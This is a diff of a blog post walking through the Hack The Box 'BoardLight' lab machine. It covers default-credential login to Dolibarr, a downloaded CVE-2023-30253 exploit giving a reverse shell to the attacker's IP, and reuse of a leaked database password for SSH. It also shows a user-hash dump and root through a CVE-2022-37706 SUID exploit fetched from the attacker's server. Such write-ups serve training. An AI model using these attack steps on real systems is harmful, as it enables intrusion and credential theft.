@@ -27,8 +27,7 @@ Blinded by the light!  Here we go!
 
 Run nmap and get a list of the ports.
 
-{% raw %}
-```sh
+{% capture nmap %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.11.11
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 12:52 AEDT
@@ -58,14 +57,13 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 9.52 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmap %}
 
 <br />
 Run nmap against all the ports to find any non-standard services.
 
-{% raw %}
-```sh
+{% capture nmapfull %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ sudo nmap -sS -p- -oN nmapfull 10.10.11.11               
 Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-01 12:52 AEDT
@@ -77,22 +75,21 @@ PORT   STATE SERVICE
 80/tcp open  http
 
 Nmap done: 1 IP address (1 host up) scanned in 8.76 seconds
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=nmapfull %}
 
 <br />
 Run curl to see if there is any interesting information in the headers.
 
-{% raw %}
-```sh
+{% capture curli %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ curl -I http://10.10.11.11                               
 HTTP/1.1 200 OK
 Date: Sat, 01 Feb 2025 01:53:56 GMT
 Server: Apache/2.4.41 (Ubuntu)
 Content-Type: text/html; charset=UTF-8
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=curli %}
 
 <br />
 Check the landing page that is being served on port 80.  Notice the domain at the bottom of the page.
@@ -106,10 +103,7 @@ Check the landing page that is being served on port 80.  Notice the domain at th
 <br />
 Check out the source page for the page.  Might be hidden gems burried in there.
 
-{% raw %}
-```html
-view-source:http://10.10.11.11/
-
+{% capture landingsource %}
 <!DOCTYPE html>
 <html>
 
@@ -149,16 +143,18 @@ view-source:http://10.10.11.11/
 </body>
 
 </html>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='browser' title='view-source:http://10.10.11.11/' content=landingsource %}
 
 <br />
 Update the /etc/hosts with the domain from the bottom of the page.
 
-{% raw %}
-```sh
+{% capture cathostsone %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
-└─$ cat /etc/hosts   
+└─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture etchostsone %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.11.11     board.htb
@@ -167,14 +163,16 @@ Update the /etc/hosts with the domain from the bottom of the page.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=cathostsone %}
+
+{% include codebox.html title="/etc/hosts" content=etchostsone %}
 
 <br />
 Ffuf to see if there are any subdomains.
 
-{% raw %}
-```sh
+{% capture ffufsubs %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://board.htb -H "Host: FUZZ.board.htb" -fw 6243
 
@@ -202,16 +200,18 @@ ________________________________________________
 
 crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 49ms]
 :: Progress: [114441/114441] :: Job [1/1] :: 407 req/sec :: Duration: [0:04:35] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffufsubs %}
 
 <br />
 Re-update the /etc/hosts file to include the new subdomain.
 
-{% raw %}
-```sh
+{% capture cathoststwo %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ cat /etc/hosts
+{% endcapture %}
+
+{% capture etchoststwo %}
 127.0.0.1       localhost
 127.0.1.1       kali
 10.10.11.11     board.htb crm.board.htb
@@ -220,8 +220,11 @@ Re-update the /etc/hosts file to include the new subdomain.
 ::1     localhost ip6-localhost ip6-loopback
 ff02::1 ip6-allnodes
 ff02::2 ip6-allrouters
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=cathoststwo %}
+
+{% include codebox.html title="/etc/hosts" content=etchoststwo %}
 
 <br />
 Check the landing page of the new crm subdomain.
@@ -235,8 +238,7 @@ Check the landing page of the new crm subdomain.
 <br />
 Ffuf for directories and files.
 
-{% raw %}
-```sh
+{% capture ffufdirectories %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://board.htb/FUZZ -e .txt,.bak,.pdf -fw 6243
 
@@ -267,8 +269,8 @@ css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration:
 js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 28ms]
 server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 33ms]
 :: Progress: [882236/882236] :: Job [1/1] :: 2631 req/sec :: Duration: [0:09:02] :: Errors: 0 ::
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=ffufdirectories %}
 
 <br />
 Look up dolibarr looking for any default credentials.
@@ -302,8 +304,7 @@ Research the technology and its version looking for any vulnerabilities or explo
 <br />
 Download the exploit.
 
-{% raw %}
-```sh
+{% capture downloadexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ wget https://raw.githubusercontent.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/refs/heads/main/exploit.py
 --2025-02-01 13:41:45--  https://raw.githubusercontent.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253/refs/heads/main/exploit.py
@@ -316,26 +317,24 @@ Saving to: ‘exploit.py’
 exploit.py                                                 100%[========================================================================================================================================>]  15.90K  --.-KB/s    in 0.003s  
 
 2025-02-01 13:41:46 (6.02 MB/s) - ‘exploit.py’ saved [16280/16280]
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadexploit %}
 
 <br />
 Start a listener.
 
-{% raw %}
-```sh
+{% capture startlistener %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ sudo nc -nlvp 443                                        
 [sudo] password for kali: 
 listening on [any] 443 ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=startlistener %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```sh
+{% capture runexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ python3 exploit.py http://crm.board.htb admin admin 10.10.16.12 443
 [*] Trying authentication...
@@ -344,14 +343,13 @@ Run the exploit.
 [*] Trying created site...
 [*] Trying created page...
 [*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runexploit %}
 
 <br />
 Check the listener and catch the shell.
 
-{% raw %}
-```sh
+{% capture catchshell %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ sudo nc -nlvp 443                                        
 [sudo] password for kali: 
@@ -360,16 +358,18 @@ connect to [10.10.16.12] from (UNKNOWN) [10.10.11.11] 46936
 bash: cannot set terminal process group (858): Inappropriate ioctl for device
 bash: no job control in this shell
 www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=catchshell %}
 
 <br />
 Take a look at the conf.php file for the dolibarr app.
 
-{% raw %}
-```sh
+{% capture catconf %}
 www-data@boardlight:~/html/crm.board.htb$ cat htdocs/conf/conf.php
 cat htdocs/conf/conf.php
+{% endcapture %}
+
+{% capture confphp %}
 <?php
 //
 // File generated by Dolibarr installer 17.0.0 on May 13, 2024
@@ -395,16 +395,21 @@ $dolibarr_main_db_collation='utf8_unicode_ci';
 $dolibarr_main_authentication='dolibarr';
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catconf %}
+
+{% include terminal.html language='php' title='conf.php' content=confphp %}
 
 <br />
 Review /etc/passwd to get the user of the system.
 
-{% raw %}
-```sh
+{% capture catetcpasswd %}
 www-data@boardlight:~/html/crm.board.htb$ cat /etc/passwd
 cat /etc/passwd
+{% endcapture %}
+
+{% capture etcpasswd %}
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
@@ -417,16 +422,20 @@ mysql:x:127:134:MySQL Server,,,:/nonexistent:/bin/false
 fwupd-refresh:x:128:135:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
 sshd:x:129:65534::/run/sshd:/usr/sbin/nologin
 _laurel:x:998:998::/var/log/laurel:/bin/false
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catetcpasswd %}
+
+{% include codebox.html title="/etc/passwd" content=etcpasswd %}
 
 <br />
 Use the larissag name from the passwd file and the database password from the conf.php file to ssh into the system.
 
-{% raw %}
-```sh
-larissa:serverfun2$2023!!
+<div class="info-box">
+  larissa:serverfun2$2023!!
+</div>
 
+{% capture sshlarissa %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ ssh larissa@10.10.11.11
 The authenticity of host '10.10.11.11 (10.10.11.11)' can't be established.
@@ -444,14 +453,13 @@ Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
 applicable law.
 
 larissa@boardlight:~$
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=sshlarissa %}
 
 <br />
 Get the user.txt flag.
 
-{% raw %}
-```sh
+{% capture userflag %}
 larissa@boardlight:~$ cat user.txt 
 <redacted>
 larissa@boardlight:~$ ip a
@@ -471,14 +479,13 @@ larissa@boardlight:~$ ip a
        valid_lft 86395sec preferred_lft 14395sec
     inet6 fe80::250:56ff:feb9:d2f7/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=userflag %}
 
 <br />
 Login to the database with the credentials from the conf.php.
 
-{% raw %}
-```sh
+{% capture logintomysql %}
 larissa@boardlight:/var/www/html$ mysql -u dolibarrowner -p
 Enter password: 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
@@ -494,14 +501,13 @@ owners.
 Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
 
 mysql>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=logintomysql %}
 
 <br />
 Check the databases and change to the dolibarr database.
 
-{% raw %}
-```sh
+{% capture setdatabase %}
 mysql> show databases;
 +--------------------+
 | Database           |
@@ -517,14 +523,13 @@ Reading table information for completion of table and column names
 You can turn off this feature to get a quicker startup with -A
 
 Database changed
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=setdatabase %}
 
 <br />
 Show all the tables and look for the llx_user table.
 
-{% raw %}
-```sh
+{% capture settables %}
 mysql> show tables;
 +-------------------------------------------------------------+
 | Tables_in_dolibarr                                          |
@@ -549,14 +554,13 @@ mysql> show tables;
 | llx_website_page                                            |
 +-------------------------------------------------------------+
 307 rows in set (0.00 sec)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=settables %}
 
 <br />
 Swipe the details for the users from the table.
 
-{% raw %}
-```sh
+{% capture dumpllxuser %}
 mysql> select entity, admin, login, pass_encoding, pass, pass_crypted from llx_user;
 +--------+-------+----------+---------------+------+--------------------------------------------------------------+
 | entity | admin | login    | pass_encoding | pass | pass_crypted                                                 |
@@ -565,25 +569,29 @@ mysql> select entity, admin, login, pass_encoding, pass, pass_crypted from llx_u
 |      1 |     0 | admin    | NULL          | NULL | $2y$10$gIEKOl7VZnr5KLbBDzGbL.YuJxwz5Sdl5ji3SEuiUSlULgAhhjH96 |
 +--------+-------+----------+---------------+------+--------------------------------------------------------------+
 2 rows in set (0.00 sec)
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=dumpllxuser %}
 
 <br />
 Create a passes.txt that contains the encrypted strings.
 
-{% raw %}
-```sh
+{% capture catpasses %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ cat passes.txt
+{% endcapture %}
+
+{% capture passestxt %}
 $2y$10$VevoimSke5Cd1/nX1Ql9Su6RstkTRe7UX1Or.cm8bZo56NjCMJzCm
-```
-{% endraw %}
+{% endcapture %}
+
+{% include terminal.html language='bash' title='bash' content=catpasses %}
+
+{% include codebox.html title="passes.txt" content=passestxt %}
 
 <br />
 Set john the ripper or hashcat against them.  While it runs, download linpeas.
 
-{% raw %}
-```sh
+{% capture downloadlinpeas %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/linpeas.sh                              
 --2025-02-01 13:49:07--  https://github.com/peass-ng/PEASS-ng/releases/download/20250126-41ed0f6a/linpeas.sh
@@ -602,18 +610,16 @@ linpeas.sh                                                 100%[================
 
 2025-02-01 13:49:09 (3.13 MB/s) - ‘linpeas.sh’ saved [839766/839766]
 
-                                                                                                                                                                                                                                            
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ python3 -m http.server                                             
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadlinpeas %}
 
 <br />
 Transfer the peas to the victim machine.  Run the linpeas.sh script.
 
-{% raw %}
-```sh
+{% capture runpeas %}
 larissa@boardlight:/dev/shm$ ./linpeas.sh
 
 
@@ -669,8 +675,8 @@ larissa@boardlight:/dev/shm$ ./linpeas.sh
 -rwsr-xr-x 1 root root 15K Oct 27  2023 /usr/bin/vmware-user-suid-wrapper
 
 <snip>
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runpeas %}
 
 <br />
 Research the enlightenment file that is indicated in the SUID section.
@@ -685,8 +691,7 @@ Research the enlightenment file that is indicated in the SUID section.
 <br />
 Download the new exploit that we found.
 
-{% raw %}
-```sh
+{% capture downloadenlightexploit %}
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ wget https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh
 --2025-02-14 23:00:16--  https://raw.githubusercontent.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/refs/heads/main/exploit.sh
@@ -704,14 +709,13 @@ exploit.sh                                                 100%[================
 ┌──(kali㉿kali)-[~/Documents/htb/boardlight]
 └─$ python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=downloadenlightexploit %}
 
 <br />
 Transfer the exploit to the victim machine.
 
-{% raw %}
-```sh
+{% capture transferprivescexploit %}
 larissa@boardlight:~$ wget 10.10.16.12:8000/exploit.sh
 --2025-02-14 04:01:05--  http://10.10.16.12:8000/exploit.sh
 Connecting to 10.10.16.12:8000... connected.
@@ -724,14 +728,13 @@ exploit.sh                                                 100%[================
 2025-02-14 04:01:05 (47.7 MB/s) - ‘exploit.sh’ saved [709/709]
 
 larissa@boardlight:~$ chmod +x exploit.sh
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=transferprivescexploit %}
 
 <br />
 Run the exploit.
 
-{% raw %}
-```sh
+{% capture runprivescexploit %}
 larissa@boardlight:~$ ./exploit.sh 
 CVE-2022-37706
 [*] Trying to find the vulnerable SUID file...
@@ -742,14 +745,13 @@ CVE-2022-37706
 mount: /dev/../tmp/: can't find in /etc/fstab.
 # whoami
 root
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=runprivescexploit %}
 
 <br />
 Get the root.txt flag.
 
-{% raw %}
-```sh
+{% capture rootflag %}
 # cat /root/root.txt
 <redacted>
 # ip a
@@ -769,8 +771,8 @@ Get the root.txt flag.
        valid_lft 86392sec preferred_lft 14392sec
     inet6 fe80::250:56ff:feb9:274f/64 scope link 
        valid_lft forever preferred_lft forever
-```
-{% endraw %}
+{% endcapture %}
+{% include terminal.html language='bash' title='bash' content=rootflag %}
 
 <br />
 Wrapped up another one.  Hope you enjoyed.  See you in the next.
